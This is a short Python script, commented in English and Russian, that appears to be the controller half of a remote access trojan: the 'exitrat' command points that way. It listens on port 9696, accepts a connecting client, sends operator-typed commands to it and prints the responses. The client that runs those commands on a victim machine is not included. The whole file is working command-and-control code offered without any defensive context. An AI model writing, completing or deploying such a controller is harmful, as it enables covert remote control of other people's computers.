import socket
import sys
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = ''
PORT = 9696


def main():
    # Start to listen and wait for connect / Ожидание подключения
    s.bind((HOST, PORT))
    s.listen(10000)
    print('Server listening on port 9696')
    # Accept connection / Принятие подключения
    conn, addr = s.accept()
    print('[+] ' + str(addr))
    # Command processor / Обработчик команд
    while True:
        # Variable with command / Переменная с командой
        cmd = input('[CONSOLE] -> ').rstrip()

        # If command = nothing - continue loop / Если команда ничему не равна -  продолжаем цикл
        if cmd == '':
            continue

        # Send command to client / Отправляем команды клиенту
        conn.send(bytes(cmd, encoding="utf-8", errors="ignore"))

        # Stop server / Останавливаем сервер
        if cmd == 'exitrat':
            s.close()
            exit()
        else:
            # Variable with client answer / Переменная с ответом от сервера
            data = conn.recv(4096)
            print(str(data, encoding="utf-8", errors="ignore"))

if __name__ == '__main__':
    main()
